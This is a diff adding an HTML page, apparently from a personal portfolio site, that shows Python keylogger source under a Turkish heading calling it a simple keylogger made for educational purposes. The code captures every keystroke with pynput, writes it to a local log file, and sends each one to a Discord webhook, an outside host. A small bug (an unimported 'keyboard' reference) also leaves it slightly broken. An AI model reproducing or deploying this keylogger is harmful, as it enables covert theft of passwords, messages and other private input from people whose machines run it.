@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <title>Poor Mankind</title>
+    <link rel="stylesheet" href="cplus-keylogger.css">
+    <style>
+        html {
+            font-family: "Inter", sans-serif;
+            scroll-behavior: smooth;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: #101010;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+        }
+
+        .game-description {
+            padding: 20px;
+            text-align: center;
+        }
+
+        .download-button {
+            margin-top: 20px;
+        }
+
+        .nav-bar {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1a1b1e;
+            border-radius: 50px;
+            padding: 10px 20px;
+            opacity: 0.8;
+            display: flex;
+            justify-content: center;
+        }
+
+        .nav-bar ul {
+            list-style: none;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            gap: 20px;
+        }
+
+        .nav-bar ul li {
+            display: inline-block;
+        }
+
+        .nav-bar ul li a {
+            color: white;
+            text-decoration: none;
+            font-size: 1em;
+            padding: 10px 15px;
+            border-radius: 30px;
+            transition: background 0.3s;
+        }
+
+        .nav-bar ul li a:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+        
+        .code-container {
+            width: 80%;
+            background-color: #2e2e2e;
+            color: #f8f8f2;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-family: 'Courier New', Courier, monospace;
+            overflow-x: auto;
+            white-space: pre-wrap; 
+            word-wrap: break-word; 
+        }
+
+        .code-container pre {
+            margin: 0;
+            padding: 0;
+            font-size: 16px;
+            line-height: 1.6;
+        }
+
+        .code-container span {
+            color: #8a8a8a;
+        }
+
+        .code-container .keyword {
+            color: #ff79c6;
+        }
+
+        .code-container .string {
+            color: #50fa7b;
+        }
+
+        .code-container .function {
+            color: #8be9fd;
+        }
+
+        .code-container .type {
+            color: #ffb86c;
+        }
+
+        .code-container .number {
+            color: #bd93f9;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="game-description">
+        <div class="description">
+            <p style="font-size: 40px; font-weight: 700;">
+                Eğitici amaç ile yapılmış çok basit Python ile hazırlanmış bir keylogger
+            </p>
+        </div>
+    </div>
+
+   
+    <div class="code-container" style="margin-bottom: 150px;">
+        <pre>
+<span class="keyword">import</span> logging
+<span class="keyword">import</span> requests
+<span class="keyword">from</span> pynput.keyboard <span class="keyword">import</span> Listener
+<span class="keyword">import</span> json
+<span class="keyword">import</span> threading
+<span class="keyword">import</span> time
+
+# Discord Webhook 
+WEBHOOK_URL = <span class="string">"https://discord.com/api/webhooks/YOUR_WEBHOOK_URL"</span>
+
+
+<span class="function">def</span> <span class="keyword">format_key</span>(key):
+    <span class="keyword">try</span>:
+        <span class="keyword">if</span> hasattr(key, <span class="string">'char'</span>) <span class="keyword">and</span> key.char <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:
+            <span class="keyword">return</span> f"Tuş basıldı: {key.char}"  # Normal karakterler
+        <span class="keyword">elif</span> key == keyboard.Key.space:
+            <span class="keyword">return</span> "Tuş basıldı: [Space]"
+        <span class="keyword">elif</span> key == keyboard.Key.enter:
+            <span class="keyword">return</span> "Tuş basıldı: [Enter]"
+        <span class="keyword">elif</span> key == keyboard.Key.backspace:
+            <span class="keyword">return</span> "Tuş basıldı: [Backspace]"
+        <span class="keyword">elif</span> key == keyboard.Key.shift:
+            <span class="keyword">return</span> "Tuş basıldı: [Shift]"
+        <span class="keyword">else</span>:
+            <span class="keyword">return</span> f"Tuş basıldı: {str(key)}"  # Diğer özel tuşlar
+    <span class="keyword">except</span> <span class="keyword">Exception</span> <span class="keyword">as</span> e:
+        logging.error(f"Tuş formatlama hatası: {e}")
+        <span class="keyword">return</span> str(key)
+
+<span class="function">def</span> <span class="keyword">send_to_discord</span>(message):
+    <span class="keyword">try</span>:
+        data = {
+            "content": message,
+            "username": "Keylogger Bot",  
+            "avatar_url": "https://i.imgur.com/zLKiIi1.png"  # Webhook için bot avatar URL'si
+        }
+        response = requests.post(WEBHOOK_URL, json=data)
+        response.raise_for_status()  # Hata varsa raise eder
+    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:
+        logging.error(f"Discord'a gönderim hatası: {e}")
+
+<span class="function">def</span> <span class="keyword">on_press</span>(key):
+    formatted_key = format_key(key)
+    send_to_discord(formatted_key) 
+    logging.info(f"Basılan tuş: {formatted_key}")  # Tuşu logluyoruz (yerel)
+
+<span class="function">def</span> <span class="keyword">start_listener</span>():
+    <span class="keyword">with</span> Listener(on_press=on_press) <span class="keyword">as</span> listener:
+        listener.join()  
+
+<span class="function">def</span> <span class="keyword">start_logging</span>():
+    logging.basicConfig(
+        level=logging.INFO,
+        format="%(asctime)s - %(message)s",
+        handlers=[
+            logging.FileHandler("keylogger.log"),  # log dosyasına yazma
+            logging.StreamHandler()  # Konsola yazma
+        ]
+    )
+    
+    logging.info("Keylogger başlatıldı... Tuşları kaydediyorum.")
+    start_listener() 
+
+<span class="function">if</span> <span class="keyword">__name__</span> == <span class="string">"__main__"</span>:
+    <span class="keyword">try</span>:
+        logging.info("Başlatılıyor")
+        logging_thread = threading.Thread(target=start_logging)
+        logging_thread.start()
+
+        
+        <span class="keyword">while</span> <span class="keyword">True</span>:
+            time.sleep(1)
+    <span class="keyword">except</span> KeyboardInterrupt:
+        logging.info("durdu.")
+        logging_thread.join()  # Thread bitene kadar bekle
+        </pre>
+    </div>
+
+    
+    <nav class="nav-bar">
+        <ul>
+            <li><a href="index.html">Home</a></li>
+            <li><a href="index.html#nav-Projects">Projects</a></li>
+            <li><a href="index.html#knowledge">Knowledge</a></li>
+            <li><a href="contact.html">Contact</a></li>
+        </ul>
+    </nav>
+
+</body>
+
+</html>
